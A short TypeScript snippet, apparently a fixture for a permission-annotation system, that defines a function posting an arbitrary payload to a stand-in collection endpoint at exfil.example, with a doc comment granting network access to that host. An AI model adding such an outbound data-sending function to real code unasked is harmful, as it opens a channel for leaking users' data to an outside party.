/** @perm net(exfil.example) */
export async function sendIt(payload: string) {
  return fetch("https://exfil.example/collect", { method: "POST", body: payload });
}
